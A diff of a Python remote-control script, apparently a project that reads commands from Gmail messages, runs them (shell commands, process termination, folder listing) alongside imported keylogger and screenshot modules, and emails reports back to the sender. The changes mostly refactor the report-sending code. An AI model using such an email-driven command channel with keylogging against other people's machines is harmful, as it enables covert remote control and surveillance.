@@ -2,6 +2,7 @@ from __future__ import print_function
 
 import time
 import base64
+import re
 import os.path
 import Pc
 import ScreenShots
@@ -9,7 +10,6 @@ import MAC_IP
 import SystemInfo
 import TaskManager
 import CommandLine
-import TerminateTask
 import Folder
 import Keylogger
 
@@ -108,7 +108,7 @@ def checkRequirement(lines):
                 cmd = CommandLine.runShellCommand(command_argument)
                 report = f"Terminal: {cmd}"
             elif command_execute == "Terminate":
-                id = TerminateTask.terminate_process(command_argument)
+                id = TaskManager.terminate_process(command_argument)
                 report = f"Terminate: {id}"
             elif command_execute == "Folder Tree":
                 foldertree = Folder.getFolderTree(command_argument)
@@ -125,30 +125,32 @@ def checkRequirement(lines):
             except Exception as e:
                 print(f"Error writing to file: {e}")
 
-def sendReport(reportPath, recipient_email):
+def sendReport(email_sender):
     global service
-
     message = MIMEMultipart()
-    message['to'] = recipient_email
-    message['subject'] = "Report"
+    message['to'] = email_sender
+    message['subject'] = '[RDCVE] - Report'
 
-    msg = MIMEMultipart()
-    msg.attach(MIMEText('Please find the report attached.'))
-
-    attachment = open(reportPath, 'rb')
-    report = MIMEBase('application', 'octet-stream')
-    report.set_payload(attachment.read())
-    encoders.encode_base64(report)
-    report.add_header('Content-Disposition', f'attachment; filename=report.txt')
-    msg.attach(report)
-
-    raw_message = base64.urlsafe_b64encode(msg.as_bytes()).decode()
+    body = 'Requirement has been recorded.\nPlease check the attached file for more details.'
+    message.attach(MIMEText(body, 'plain'))
 
     try:
-        service.users().messages().send(userId='me', body={'raw': raw_message}).execute()
-        print("Report sent successfully!")
+        with open('report.txt', 'r') as file:
+            attachment = MIMEBase('application', 'octet-stream')
+            attachment.set_payload(file.read())
+            encoders.encode_base64(attachment)
+            attachment.add_header('Content-Disposition', 'attachment', filename='report.txt')
+            message.attach(attachment)
+    except Exception as e:
+        print(f"Error attaching file: {e}")
+        return
+
+    raw_message = base64.urlsafe_b64encode(message.as_bytes()).decode('utf-8')
+    try:
+        message = service.users().messages().send(userId='me', body={'raw': raw_message}).execute()
+        print('Report sent successfully!')
     except HttpError as error:
-        print(f"An error occurred: {error}")
+        print(f'An error occurred while sending the report: {error}')
 
 def main():
     global creds
@@ -170,7 +172,7 @@ def main():
                         name = values['name']
                         if name == 'From':
                             print(f"From: {values['value']}") #print the sender address
-                            from_name = values['value']
+                            email_sender = re.search(r'<([^>]+)>', values['value']).group(1)
                     for part in msg['payload']['parts']:
                         try:
                             data = part['body']["data"]
@@ -183,7 +185,7 @@ def main():
                                 lines = text.split('\n')
                                 message_count += 1
                                 checkRequirement(lines)
-                                sendReport(reportPath, name)
+                                sendReport(email_sender)
                             # mark the message as read (optional)
                             # msg = service.users().messages().modify(userId='me', id=message['id'], body={'removeLabelIds': ['UNREAD']}).execute()
                         except BaseException as error:
